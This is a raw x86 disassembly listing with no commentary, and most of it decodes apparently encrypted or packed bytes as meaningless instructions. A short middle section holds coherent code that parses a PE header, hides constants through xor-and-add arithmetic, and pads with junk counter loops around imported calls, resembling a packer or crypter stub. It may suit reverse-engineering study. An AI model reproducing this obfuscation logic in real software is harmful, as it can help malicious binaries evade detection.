  417ad9:	dec    edx
  417ada:	mov    ds:0x6c8fa3de,al
  417adf:	sub    DWORD PTR [eax-0x4f],esi
  417ae2:	xor    ch,BYTE PTR [ecx]
  417ae4:	out    dx,al
  417ae5:	lds    esi,FWORD PTR [ecx+0x70]
  417ae8:	(bad)
  417aec:	inc    esp
  417aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aee:	push   ebp
  417aef:	ss hlt 
  417af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417af2:	xchg   edx,eax
  417af3:	(bad)  
  417af4:	push   es
  417af5:	pop    esp
  417af6:	or     eax,0x5febd44c
  417afb:	inc    ebx
  417afc:	rcl    DWORD PTR [edi+0x6143dc0e],0x1e
  417b03:	dec    ebx
  417b04:	mov    ebp,0x3603abee
  417b09:	jns    0x417b19
  417b0b:	rol    DWORD PTR [ecx+0x7b39950b],1
  417b11:	rcl    DWORD PTR [eax+0x19fec38],cl
  417b17:	lods   al,BYTE PTR ds:[esi]
  417b18:	aas    
  417b19:	mov    dh,0x74
  417b1b:	aas    
  417b1c:	jge    0x417adf
  417b1e:	int    0x23
  417b20:	leave  
  417b21:	push   0x510fe0bc
  417b26:	sub    al,0xf6
  417b28:	mov    BYTE PTR [ecx+eax*1+0x23],cl
  417b2c:	push   ss
  417b2d:	es out dx,eax
  417b2f:	jg     0x417b4a
  417b31:	adc    BYTE PTR [eax+0x6d],dh
  417b34:	jecxz  0x417ae6
  417b36:	nop
  417b37:	mov    ds:0x50a1b927,al
  417b3c:	lea    edx,[edx+0x63834bec]
  417b42:	xchg   BYTE PTR [edx-0x49],dh
  417b45:	js     0x417aec
  417b47:	adc    edi,DWORD PTR [esi]
  417b49:	daa    
  417b4a:	xchg   edi,eax
  417b4b:	mov    dh,0x2a
  417b4d:	test   DWORD PTR [edi],ebp
  417b4f:	nop
  417b50:	jp     0x417b74
  417b52:	enter  0x70fc,0x4d
  417b56:	ins    BYTE PTR es:[edi],dx
  417b57:	rol    BYTE PTR [eax+0x8],1
  417b5a:	add    esp,ebx
  417b5c:	mov    eax,ds:0x25431d3d
  417b61:	rcr    BYTE PTR [esi],cl
  417b63:	into   
  417b64:	push   edi
  417b65:	fadd   QWORD PTR [edx]
  417b67:	mov    al,0xb1
  417b69:	add    BYTE PTR [ebp-0x42],ch
  417b6c:	push   ecx
  417b6d:	jle    0x417b16
  417b6f:	call   DWORD PTR [edx+0x54f40821]
  417b75:	fiadd  DWORD PTR [eax+0x38]
  417b78:	ss pop esp
  417b7a:	daa    
  417b7b:	loope  0x417bed
  417b7d:	pop    ebp
  417b7e:	dec    esp
  417b7f:	inc    edx
  417b80:	dec    esi
  417b81:	mov    ?,WORD PTR [esp+ecx*1+0x50264132]
  417b88:	out    0x17,eax
  417b8a:	test   eax,0x70f6101b
  417b8f:	lea    ebp,[ecx]
  417b91:	ja     0x417b3b
  417b93:	pop    ebx
  417b94:	cmp    ebp,DWORD PTR [esi-0x45ff7902]
  417b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9b:	inc    ebx
  417b9c:	mov    ds:0x2c5da31f,eax
  417ba1:	mov    dh,0xaf
  417ba3:	sub    al,0xa9
  417ba5:	outs   dx,BYTE PTR ds:[esi]
  417ba6:	ins    DWORD PTR es:[edi],dx
  417ba7:	dec    ecx
  417ba8:	fisttp DWORD PTR [eax-0x64c2b770]
  417bae:	sbb    bh,BYTE PTR [esi+0x35]
  417bb1:	mov    ch,0x61
  417bb3:	scas   eax,DWORD PTR es:[edi]
  417bb4:	fdivr  QWORD PTR [eax-0x5c]
  417bb7:	mov    BYTE PTR [ebx+0x1f],ch
  417bba:	cld    
  417bbb:	push   esp
  417bbc:	inc    eax
  417bbd:	adc    BYTE PTR ds:0xa5947951,cl
  417bc3:	push   ss
  417bc4:	mov    esp,0xc52675bb
  417bc9:	mov    ds:0xd9228e50,al
  417bce:	(bad)  
  417bcf:	jmp    0x910a560c
  417bd4:	mov    ebx,DWORD PTR [ecx-0x68e8743b]
  417bda:	in     eax,0x91
  417bdc:	dec    ecx
  417bdd:	push   ss
  417bde:	mov    esi,0x3b7ca69d
  417be3:	xor    eax,0x50bed762
  417be8:	mov    ebx,0x95417d51
  417bed:	xor    BYTE PTR [ebp-0x249dbef4],bl
  417bf3:	and    BYTE PTR [esi+ebp*1+0x43],al
  417bf7:	jns    0x417c67
  417bf9:	dec    ebx
  417bfa:	or     BYTE PTR [ebx-0x1d],dh
  417bfd:	outs   dx,DWORD PTR ds:[esi]
  417bfe:	sub    DWORD PTR [edi+0xb],0xa
  417c02:	mov    bh,BYTE PTR [ebx]
  417c04:	fs ret 
  417c06:	and    eax,0x655dc263
  417c0b:	dec    BYTE PTR [edi+edi*8-0x63]
  417c0f:	mov    ebp,0x7bc3ce1b
  417c14:	xor    esi,edi
  417c16:	mov    ecx,0x9f474abb
  417c1b:	sbb    DWORD PTR [esp+edi*2],ebx
  417c1e:	inc    ebx
  417c1f:	loop   0x417bd2
  417c21:	enter  0x4596,0x8
  417c25:	data16 ror BYTE PTR [ecx-0x44],cl
  417c29:	or     eax,0xa188af28
  417c2e:	xchg   ecx,eax
  417c2f:	aas    
  417c30:	loope  0x417c30
  417c32:	add    esi,edi
  417c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c35:	dec    esp
  417c36:	pop    edx
  417c37:	xchg   bh,al
  417c39:	les    eax,FWORD PTR ds:0x2c1275ad
  417c3f:	pop    ebx
  417c40:	mov    al,ds:0x4439e218
  417c45:	rcr    BYTE PTR [edx+0x1ec04e3d],cl
  417c4b:	leave  
  417c4c:	push   edx
  417c4d:	cdq    
  417c4e:	in     al,0x5c
  417c50:	ss dec eax
  417c52:	retf   0xd948
  417c55:	xor    al,0xc3
  417c57:	sub    BYTE PTR [esi-0x2d2f2622],al
  417c5d:	cmp    DWORD PTR [esi],eax
  417c5f:	push   0x6a835c9b
  417c64:	pop    esi
  417c65:	popa   
  417c66:	push   ss
  417c67:	add    DWORD PTR [ecx+0xc],ebx
  417c6a:	inc    ebx
  417c6b:	mov    ebx,0x631eb41f
  417c70:	push   ss
  417c71:	and    esi,edi
  417c73:	int    0xfc
  417c75:	(bad)  
  417c76:	push   cs
  417c77:	data16 loope 0x417c08
  417c7a:	push   edx
  417c7b:	aad    0xe4
  417c7d:	xor    edi,0x25caa7ad
  417c83:	xchg   esi,eax
  417c84:	xlat   BYTE PTR ds:[ebx]
  417c85:	xchg   edx,eax
  417c86:	in     eax,0x5
  417c88:	stos   BYTE PTR es:[edi],al
  417c89:	pusha  
  417c8a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c8c:	je     0x417c48
  417c8e:	fcomp  st(6)
  417c90:	shl    BYTE PTR [eax+0x7fd313be],cl
  417c96:	fwait
  417c97:	jbe    0x417c49
  417c99:	mov    esi,0x704529de
  417c9e:	sbb    al,0x7f
  417ca0:	jl     0x417cb6
  417ca2:	arpl   WORD PTR [esi+0x72],di
  417ca5:	lahf   
  417ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ca7:	es cmp ecx,ebx
  417caa:	and    esp,DWORD PTR [edi+0x4c58f855]
  417cb0:	xor    al,0x2b
  417cb2:	int3   
  417cb3:	mov    ebp,0x8bfb672b
  417cb8:	mov    ecx,0xddff21ed
  417cbd:	enter  0x8d85,0x71
  417cc1:	jne    0x417cf0
  417cc3:	and    bh,al
  417cc5:	test   DWORD PTR [eax],edi
  417cc7:	(bad)  
  417cc9:	push   edi
  417cca:	xlat   BYTE PTR ds:[ebx]
  417ccb:	jno    0x417d0f
  417ccd:	(bad)  
  417cce:	in     eax,dx
  417ccf:	adc    ecx,DWORD PTR [edi+esi*2-0x8]
  417cd3:	lahf   
  417cd4:	dec    esp
  417cd5:	jne    0x417d3a
  417cd7:	mov    ds:0x110007f,al
  417cdc:	les    ebp,FWORD PTR [edi-0x71cf2bc3]
  417ce2:	cli    
  417ce3:	mov    eax,ds:0x8c1a9b80
  417ce8:	loopne 0x417c6e
  417cea:	fisttp QWORD PTR [ebx+edx*2+0x465f0455]
  417cf1:	jg     0x417d6f
  417cf3:	or     esi,DWORD PTR [ecx]
  417cf5:	pop    ecx
  417cf6:	add    eax,0xc03e4465
  417cfb:	ins    DWORD PTR es:[edi],dx
  417cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cfd:	sti    
  417cfe:	sub    al,0xe9
  417d00:	and    al,0xa
  417d02:	adc    eax,0xadfc1136
  417d07:	mov    edx,0xbb94bf15
  417d0c:	jne    0x417d63
  417d0e:	aaa    
  417d0f:	pop    eax
  417d10:	(bad)  
  417d11:	retf   
  417d12:	xor    ecx,DWORD PTR [edx-0x72]
  417d15:	jno    0x417cb1
  417d17:	cli    
  417d18:	mov    bh,0x59
  417d1a:	mov    ch,0xc6
  417d1c:	add    bh,BYTE PTR [ebx]
  417d1e:	or     ebp,DWORD PTR [eax-0xb943f3]
  417d24:	or     ebp,DWORD PTR [ebp-0x18]
  417d27:	dec    ebx
  417d28:	jmp    0x6e5aace8
  417d2d:	loopne 0x417d87
  417d2f:	xchg   ecx,eax
  417d30:	hlt    
  417d31:	lea    ebx,[eax-0x6d9403aa]
  417d37:	dec    ebp
  417d38:	(bad)  
  417d39:	cmc    
  417d3a:	gs xchg ecx,eax
  417d3c:	pop    ds
  417d3d:	test   DWORD PTR [eax-0xb68e852],0x1dd29e47
  417d47:	(bad)  
  417d48:	mov    cl,0x70
  417d4a:	add    eax,0xbd5f0cdb
  417d4f:	dec    esi
  417d50:	xor    ah,BYTE PTR [edx+0x2c0ee508]
  417d56:	sbb    al,0x7b
  417d58:	mov    esp,0xf41ea0ba
  417d5d:	std    
  417d5e:	xor    ebx,0xffffffec
  417d61:	aad    0x1a
  417d63:	out    dx,al
  417d64:	daa    
  417d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d66:	mov    al,ds:0x4fccd372
  417d6b:	or     esp,DWORD PTR [esi]
  417d6d:	jnp    0x417d02
  417d6f:	dec    ebx
  417d70:	mov    esp,0xadf7c0e5
  417d75:	xor    ebx,DWORD PTR [eax+0x28]
  417d78:	imul   ebp,DWORD PTR [ebp+0x55],0x3d
  417d7c:	ret    
  417d7d:	pop    esp
  417d7e:	dec    eax
  417d7f:	push   eax
  417d80:	mov    esi,0x6eb14ecf
  417d85:	cld    
  417d86:	js     0x417df2
  417d88:	fwait
  417d89:	aas    
  417d8a:	out    0x4d,eax
  417d8c:	pop    ds
  417d8d:	xor    edi,esp
  417d8f:	and    eax,0xa3f07b48
  417d94:	rcl    BYTE PTR [edi+0x75a922e9],1
  417d9a:	pusha  
  417d9b:	repnz fs pop ebx
  417d9e:	jne    0x417dd2
  417da0:	test   BYTE PTR [eax],ah
  417da2:	or     eax,0x2fea9542
  417da7:	sbb    DWORD PTR [ebx],ebp
  417da9:	push   edi
  417daa:	cmc    
  417dab:	cli    
  417dac:	add    dl,BYTE PTR [esi]
  417dae:	inc    eax
  417daf:	loopne 0x417db1
  417db1:	retf   
  417db2:	lahf   
  417db3:	cmc    
  417db4:	test   al,0x17
  417db6:	adc    edi,DWORD PTR [ebp+0x33cedea2]
  417dbc:	int    0x48
  417dbe:	xlat   BYTE PTR ds:[ebx]
  417dbf:	nop
  417dc0:	pop    ss
  417dc1:	loopne 0x417de4
  417dc3:	mov    esp,0x5a72391f
  417dc8:	lock xor BYTE PTR [edx+ebx*2+0x371fcb75],ah
  417dd0:	adc    DWORD PTR gs:[eax-0x45],ebx
  417dd4:	fimul  WORD PTR [eax]
  417dd6:	je     0x417e4e
  417dd8:	fsub   DWORD PTR [ecx+0x67]
  417ddb:	pop    esp
  417ddc:	and    BYTE PTR [ebp+0x22eb862c],bl
  417de2:	mov    ebx,0x7cfa3118
  417de7:	sub    al,0x8a
  417de9:	pop    ebp
  417dea:	fwait
  417deb:	ins    BYTE PTR es:[edi],dx
  417dec:	sbb    bl,al
  417dee:	dec    esp
  417def:	out    0xc6,eax
  417df1:	add    al,0x4f
  417df3:	pop    edx
  417df4:	inc    esi
  417df5:	mov    WORD PTR [ebx-0x1124d6b6],ss
  417dfb:	gs mov esp,0xa257d89f
  417e01:	stc    
  417e02:	mov    ch,0xab
  417e04:	leave  
  417e05:	(bad)  
  417e06:	xor    al,0xb0
  417e08:	hlt    
  417e09:	sub    BYTE PTR [esi+0x2a8708d1],al
  417e0f:	xchg   ch,bh
  417e11:	mov    dh,0xab
  417e13:	push   ss
  417e14:	dec    ebp
  417e15:	leave  
  417e16:	pop    esi
  417e17:	popf   
  417e18:	sub    eax,0xab6d1e19
  417e1d:	test   DWORD PTR [edi-0x54846cd1],0x7f081b7d
  417e27:	stos   BYTE PTR es:[edi],al
  417e28:	ins    DWORD PTR es:[edi],dx
  417e29:	imul   al
  417e2b:	stc    
  417e2c:	iret   
  417e2d:	add    edi,edi
  417e2f:	push   es
  417e30:	dec    ebp
  417e31:	xchg   esi,eax
  417e32:	and    DWORD PTR [ecx+0x2c],edx
  417e35:	xor    BYTE PTR [eax-0x520eaeb5],0x3e
  417e3c:	jg     0x417de7
  417e3e:	outs   dx,DWORD PTR ds:[esi]
  417e3f:	(bad)
  417e43:	mov    ebp,0x84d0fa6d
  417e48:	hlt    
  417e49:	shr    DWORD PTR [edx-0xf],0x8c
  417e4d:	mov    esi,0x51d3577d
  417e52:	inc    edi
  417e53:	shr    DWORD PTR [ebx+0x8ead4f4],cl
  417e59:	in     al,0x21
  417e5b:	push   edx
  417e5c:	xchg   ebx,eax
  417e5d:	and    ebx,edi
  417e5f:	(bad)  
  417e60:	dec    ebx
  417e61:	js     0x417e5c
  417e63:	lds    edi,FWORD PTR [ecx-0x2b3adab6]
  417e69:	enter  0x91b8,0xed
  417e6d:	nop
  417e6e:	nop
  417e6f:	fist   WORD PTR [edi-0x6d]
  417e72:	jmp    0x417ebf
  417e74:	test   al,0x41
  417e76:	dec    edx
  417e77:	and    al,BYTE PTR [ebx]
  417e79:	and    eax,0x7ee3d841
  417e7e:	pop    edi
  417e7f:	fldcw  WORD PTR [eax]
  417e81:	jle    0x417ec8
  417e83:	popa   
  417e84:	aad    0x87
  417e86:	xchg   ebp,eax
  417e87:	sbb    DWORD PTR gs:[ecx],edx
  417e8a:	pusha  
  417e8b:	stc    
  417e8c:	ficomp WORD PTR [eax+ebp*1-0x5f81cbb7]
  417e93:	dec    esp
  417e94:	push   esp
  417e95:	sub    ah,BYTE PTR [edi-0x3b017032]
  417e9b:	cmc    
  417e9c:	xchg   esp,eax
  417e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e9e:	push   eax
  417e9f:	lea    esp,[ebx+0x5923dab4]
  417ea5:	push   ecx
  417ea6:	xchg   DWORD PTR [ecx+0x48478ce8],eax
  417eac:	dec    eax
  417ead:	add    ebx,edx
  417eaf:	ficom  DWORD PTR [edx+0x1]
  417eb2:	dec    ebx
  417eb3:	push   0xd840c6ca
  417eb8:	mov    bh,0x25
  417eba:	lock dec esi
  417ebc:	push   ss
  417ebd:	xchg   esi,eax
  417ebe:	jae    0x417f02
  417ec0:	(bad)  
  417ec2:	adc    al,0xf0
  417ec4:	jge    0x417e98
  417ec6:	sub    BYTE PTR ds:0x1daedd92,al
  417ecc:	or     DWORD PTR [ebx],esi
  417ece:	pop    ebp
  417ecf:	add    al,bl
  417ed1:	sqrtps xmm3,xmm7
  417ed4:	aad    0x7
  417ed6:	pop    ebp
  417ed7:	dec    esi
  417ed8:	mov    ch,0xb1
  417eda:	push   0xdcfcc9de
  417edf:	push   ds
  417ee0:	test   DWORD PTR [ebx+0x15],edi
  417ee3:	test   ecx,0x1c8eb1c2
  417ee9:	out    0x41,al
  417eeb:	or     eax,0xfe9e6089
  417ef0:	(bad)  
  417ef1:	mov    edi,0x3e8fc689
  417ef6:	imul   esp,DWORD PTR [edx+0x9],0x70
  417efa:	add    al,0xf5
  417efc:	adc    eax,0x8c03a2bc
  417f01:	mov    ecx,DWORD PTR [edx-0x66]
  417f04:	aaa    
  417f05:	cdq    
  417f06:	push   0x49d5d79
  417f0b:	jmp    0x33b8:0x8240c511
  417f12:	push   eax
  417f14:	mov    esp,0xae34d4eb
  417f19:	mov    BYTE PTR [ebx],ah
  417f1b:	sbb    esp,esi
  417f1d:	push   ebp
  417f1e:	mov    cl,BYTE PTR [ecx+0x30049b14]
  417f24:	mov    al,BYTE PTR [eax]
  417f26:	add    DWORD PTR ds:0x429004,0x244e
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42005b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d1ec
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	inc    edx
  418114:	dec    DWORD PTR [ebx-0x2a]
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx-0x6]
  418120:	aam    0xd
  418122:	mov    ah,BYTE PTR [ebp-0x3]
  418125:	mov    eax,ds:0x8d3148b0
  41812a:	retf   
  41812b:	retf   
  41812c:	fidivr DWORD PTR [esi]
  41812e:	mov    eax,ds:0x9a3c1a51
  418133:	dec    ecx
  418135:	and    esp,esi
  418137:	stos   DWORD PTR es:[edi],eax
  418138:	mov    dl,0x3d
  41813a:	imul   dh
  41813c:	inc    edx
  41813d:	ret    
  41813e:	jo     0x418137
  418140:	mov    edi,0x7257d94b
  418145:	ins    DWORD PTR es:[edi],dx
  418146:	popf   
  418147:	jecxz  0x4180d9
  418149:	rol    DWORD PTR [eax+0x7],cl
  41814c:	and    DWORD PTR [edx+ecx*8+0x3c],esi
  418150:	les    edi,FWORD PTR [esi+0x20]
  418153:	or     BYTE PTR [ecx],dh
  418155:	fisttp WORD PTR [ecx-0x56]
  418158:	push   ds
  418159:	es push eax
  41815b:	xor    esp,DWORD PTR [esi]
  41815d:	push   esi
  41815e:	pusha  
  41815f:	mov    al,0x82
  418161:	jno    0x418191
  418163:	push   eax
  418164:	call   0x1d2d407
  418169:	sub    al,0x3
  41816b:	inc    ecx
  41816c:	mov    ecx,0x5b9de19f
  418171:	cli    
  418172:	mov    cl,0x35
  418174:	inc    ebp
  418175:	mov    esp,0xb8ef71d9
  41817a:	lahf   
  41817b:	(bad)  
  41817c:	(bad)  
  41817d:	jae    0x418154
  41817f:	jnp    0x4181a7
  418181:	push   edi
  418182:	retf   
  418183:	xor    DWORD PTR [eax-0xc8a3ef7],ecx
  418189:	int    0x8
  41818b:	loop   0x418173
  41818d:	cmp    DWORD PTR [edi-0x73],esp
  418190:	lods   al,BYTE PTR ds:[esi]
  418191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418192:	and    dl,dh
  418194:	mov    esi,0x9579b03c
  418199:	xor    dh,BYTE PTR [ecx]
  41819b:	int3   
  41819c:	in     eax,0x2a
  41819e:	adc    al,0x6e
  4181a0:	ret    
  4181a1:	add    ecx,esp
  4181a3:	mov    ds:0x8cc7b88b,eax
  4181a8:	mov    DWORD PTR [eax],esi
  4181aa:	inc    eax
  4181ab:	mov    ss,WORD PTR [ebx-0x35]
  4181ae:	inc    ebx
  4181af:	test   DWORD PTR [esi-0x1e],esp
  4181b2:	adc    esp,DWORD PTR [eax-0x80]
  4181b5:	cmp    DWORD PTR [esi+0x1ae4ab17],0xffffffd9
  4181bc:	and    eax,0xe03e7c41
  4181c1:	pop    edi
  4181c2:	jo     0x418241
  4181c4:	lods   eax,DWORD PTR ds:[esi]
  4181c5:	sbb    eax,0x40883ca8
  4181ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181cb:	adc    ebx,0x41
  4181ce:	adc    BYTE PTR [edi+0x3145f1b7],cl
  4181d4:	cmp    al,0x61
  4181d6:	jmp    0x4181f5
  4181d8:	cli    
  4181d9:	std    
  4181da:	fdiv   DWORD PTR [esi]
  4181dc:	pop    esp
  4181dd:	(bad)  
  4181de:	jmp    0x5b3b:0xbcb32024
  4181e5:	sub    ah,cl
  4181e7:	mov    ch,ch
  4181e9:	mov    bh,0x3b
  4181eb:	pop    es
  4181ec:	test   DWORD PTR [ecx-0x11608370],0x701009f8
  4181f6:	pop    ss
  4181f7:	jb     0x418245
  4181f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181fa:	pop    ebp
  4181fb:	inc    edx
  4181fc:	leave  
  4181fd:	pop    esi
  4181fe:	pop    edx
  4181ff:	adc    eax,0x5e9bcb5f
  418204:	ins    DWORD PTR es:[edi],dx
  418205:	ror    BYTE PTR [ebx],cl
  418207:	xchg   ecx,eax
  418208:	retf   
  418209:	(bad)  
  41820a:	mov    edx,ss
  41820c:	(bad)  
  41820e:	xlat   BYTE PTR ds:[ebx]
  41820f:	ficom  WORD PTR [edi]
  418211:	dec    esi
  418212:	arpl   WORD PTR [ebp+0x6b],di
  418215:	inc    eax
  418216:	mov    edx,0xad005335
  41821b:	sahf   
  41821c:	or     BYTE PTR [edi-0x285032e7],dh
  418222:	jne    0x4181b6
  418224:	xchg   esp,eax
  418225:	test   al,0x10
  418227:	inc    ecx
  418228:	imul   esi,DWORD PTR [ecx+0xb2bba40],0xb6a9894b
  418232:	fs enter 0x3f26,0x98
  418237:	cmp    al,0x83
  418239:	pushf  
  41823a:	xlat   BYTE PTR gs:[ebx]
  41823c:	jnp    0x4181c7
  41823e:	out    dx,al
  41823f:	aam    0xa8
  418241:	stc    
  418242:	cmp    BYTE PTR [ebp+0x49],al
  418245:	stc    
  418246:	jle    0x418229
  418248:	lahf   
  418249:	ret    0x3a59
  41824c:	and    dh,0xd8
  41824f:	xchg   DWORD PTR ds:0xed897a27,ecx
  418255:	dec    eax
  418256:	fistp  WORD PTR [ecx+0x2]
  418259:	enter  0x9afb,0x3e
  41825d:	loopne 0x4182c5
  41825f:	inc    edx
  418260:	xor    DWORD PTR [ecx],esp
  418262:	pop    ebx
  418263:	push   cs
  418264:	cmp    WORD PTR [edx-0x3ab8e20],bp
  41826b:	xlat   BYTE PTR ds:[ebx]
  41826c:	pop    ebp
  41826d:	fcomp  st(5)
  41826f:	call   0x2f2708f8
  418274:	enter  0xc453,0xac
  418278:	add    edx,DWORD PTR [ebx]
  41827a:	mov    cl,0xae
  41827c:	inc    edi
  41827d:	call   0xcd04:0x80d9d927
  418284:	add    eax,0xcbb32500
  418289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41828a:	and    bh,cl
  41828c:	cmp    eax,0x4607f04d
  418291:	loop   0x41822d
  418293:	retf   0x504c
  418296:	lea    edx,[esi+0x3de354f4]
  41829c:	jae    0x418234
  41829e:	jge    0x418275
  4182a0:	cs jecxz 0x4182c3
  4182a3:	mov    ebp,0x766aa79d
  4182a8:	pop    esp
  4182a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182aa:	imul   ebx,DWORD PTR [edx],0x5f
  4182ad:	sub    al,0x48
  4182af:	push   esp
  4182b0:	jmp    0x9e23:0x87f0f66f
  4182b7:	lds    ecx,FWORD PTR [esi+0x30]
  4182ba:	es sbb eax,0x19a8ff10
  4182c0:	paddb  mm1,QWORD PTR ds:0xebbb2f3b
  4182c7:	jae    0x4182dd
  4182c9:	adc    al,0xda
  4182cb:	mov    WORD PTR [edi+0x20],ss
  4182ce:	mov    ds:0x46b60db3,al
  4182d3:	sar    DWORD PTR [edx+0x280cd84b],cl
  4182d9:	ficom  WORD PTR [esi]
  4182db:	jae    0x418310
  4182dd:	sar    BYTE PTR [esi-0x4e],cl
  4182e0:	push   0xd
  4182e2:	inc    ecx
  4182e3:	int3   
  4182e4:	push   edx
  4182e5:	xor    BYTE PTR [esi+0x68],ch
  4182e8:	(bad)  
  4182e9:	ins    DWORD PTR es:[edi],dx
  4182ea:	call   0xf7b6:0xa751af7a
  4182f1:	lea    ebx,[esi]
  4182f3:	inc    ecx
  4182f4:	pop    esi
  4182f5:	or     eax,0x69b016e5
  4182fa:	xchg   dl,ch
  4182fc:	xor    esi,ebx
  4182fe:	mov    edi,DWORD PTR [esi+0x35ef6127]
  418304:	xor    al,0x7c
  418306:	add    bl,bl
  418308:	jnp    0x4182e8
  41830a:	pop    esp
  41830b:	dec    ecx
  41830c:	shl    ebx,0x6
  41830f:	pop    ds
  418310:	out    0x70,al
  418312:	retf   0x19e9
  418315:	mov    ecx,0x7859a082
  41831a:	mov    ecx,0x7f9aa012
  41831f:	mov    ebx,0x3b1bb726
  418324:	jg     0x418393
  418326:	push   ecx
  418327:	cs adc al,0xbd
  41832a:	push   0xb9f4b769
  41832f:	jle    0x418366
  418331:	push   ebx
  418332:	and    BYTE PTR [esi-0x44],dh
  418335:	(bad)  
  418336:	pop    esi
  418337:	jbe    0x418307
  418339:	xor    esi,edx
  41833b:	push   ecx
  41833c:	ins    DWORD PTR es:[edi],dx
  41833d:	aaa    
  41833e:	test   BYTE PTR [esi],dh
  418340:	add    eax,0xabeef429
  418345:	repnz add eax,0x8e297dfd
  41834b:	mov    dl,0xb8
  41834d:	or     BYTE PTR ds:0x9a40761,bl
  418353:	jl     0x4183a0
  418355:	in     eax,0x92
  418357:	cmc    
  418358:	aam    0x7e
  41835a:	or     al,0xd
  41835c:	dec    esp
